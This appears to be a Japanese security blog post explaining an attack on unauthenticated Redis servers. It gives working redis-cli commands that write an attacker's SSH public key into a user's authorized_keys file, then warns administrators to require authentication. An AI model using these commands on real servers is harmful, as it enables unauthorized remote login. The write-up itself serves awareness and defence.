title: Redisで任意のファイルをアップロードする攻撃
date: 2016-03-07 20:41:31
tags: [honeypot, nosqlpot, redis]
---

年末年始からRedisを狙った攻撃が増加しているようです.  

* [「Redis」狙う不正アクセスが年末年始に急増 Security NEXT](http://www.security-next.com/065845)  
* [NoSQLデータベースであるRedisを標的としたアクセスについて 警察庁セキュリティポータルサイト@police](https://www.npa.go.jp/cyberpolice/topics/?seq=17577)
* [「Redis」の脆弱性を狙いファイルのアップロードを試すアクセスを観測（警察庁）](http://scan.netsecurity.ne.jp/article/2016/01/14/37930.html)

要約すると外部から任意のファイルをアップロードができるため, authorized_keysなどに攻撃者の公開鍵が作成されてしまいます.  

攻撃の例を以下に示します.  
redis-serverがuserというユーザーの権限で動いているとします.  
まず, userのauthorized_keysには何も含まれていません.  
```
user@66ac36057198:~/.ssh$ cat authorized_keys 
```

まず, 攻撃者は既に格納されているキーとバリューをクリアします.  
その後, 自身の公開鍵を適当なキー(ここではpwnというキー)で保存します.  
そしてデータを書き出すディレクトリ(/home/user/.ssh/)を設定し, ファイル名をauthorized_keysとします.  
最後にデータを書き出します. [1]

```
$ redis-cli -h 172.17.0.2 flushall
$ cat id_rsa.pub| redis-cli -h 172.17.0.2 -x set pwn
$ redis-cli -h 172.17.0.2
172.17.0.2:6379> config set dir "/home/user/.ssh"
OK
172.17.0.2:6379> config get dir
1) "dir"
2) "/home/user/.ssh"
172.17.0.2:6379> config set dbfilename "authorized_keys"
OK
172.17.0.2:6379> save
OK
```

これでuserのauthorized_keysには攻撃者の公開鍵が追加され, SSHでのログインを許してしまうことになります.  
```
user@66ac36057198:~/.ssh$ cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIUgAzqX0... mrtc0@localhost
```

もちろん, redis-serverを動かしているユーザーが書き込める権限がなければいけませんが.  

インターネットに公開した状態で認証をかけず, 適切な権限で動かしていないと大変なことになりますので注意が必要です.  

##### 参考文献

* [crack@redis.io #2](https://cocopoo.com/2015/11/crackredis-io-2/)
* [A few things about Redis security](https://www.reddit.com/r/redis/comments/3rby8c/a_few_things_about_redis_security/)

[1]: 実際はゴミデータも含まれるため (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") のようにして改行を挟む必要がある.




